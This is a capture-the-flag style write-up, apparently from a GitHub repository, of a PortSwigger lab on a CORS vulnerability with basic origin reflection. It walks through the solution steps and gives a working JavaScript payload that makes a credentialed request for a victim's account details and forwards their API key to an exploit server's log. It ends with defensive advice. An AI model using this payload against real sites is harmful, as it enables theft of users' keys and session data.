# CORS - vulnerability with basic origin reflection

## 📌 Lab Details
- **Title**: CORS vulnerability with basic origin reflection  
- **Difficulty**: Apprentice
- **Category**: Cross-origin Resource Sharing
- **Lab URL**: https://portswigger.net/academy/labs/launch/3c3123251c8faea3353dafdf70678f6d9241bbcdda2f8772ce17fb4dee20ca0d?referrer=%2fweb-security%2fcors%2flab-basic-origin-reflection-attack

## 🔍 Summary
This lab demonstrated how **insecure CORS configuration** (trusting all origins with credentials) can be exploited using `XMLHttpRequest` with `withCredentials` to steal sensitive data. By hosting malicious JavaScript on your exploit server, you retrieved the `administrator’s API key` cross-origin to complete the lab.

## 🛠 Steps to Solve
1. Use the browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to **Burp Repeater** and resubmit it with the added header: `Origin:https://example.com`.
4. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
5. Inject the payload on the **Exploit** server:
   ```sh
   <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
    </script>
    ```
6. Deliver the exploit to the victim and access the log to find the `API` key.

## 📖 Key Takeaways
- Trusting all origins with `Access-Control-Allow-Credentials` true is dangerous.
- Attack uses `XMLHttpRequest` + `withCredentials` to fetch victim's data while authenticated.
- Always **validate `Origin` header on the server side**, avoid reflecting arbitrary origins when credentials are allowed.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d71bf3d3-e595-457c-9cb3-3fcb82b9bafe" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c25e8ad2-6428-4d8b-85ac-0f589c5e40f6" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7a6c3dde-52af-4b53-8f0b-9a9b49239a07" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e65ac610-c9f3-4237-bc50-d0b36be032c3" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5fba13b5-a2f4-477a-8ddf-5e63f89531a7" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ef5ce90d-cc54-4e29-9dcc-5338b8ea1df7" />
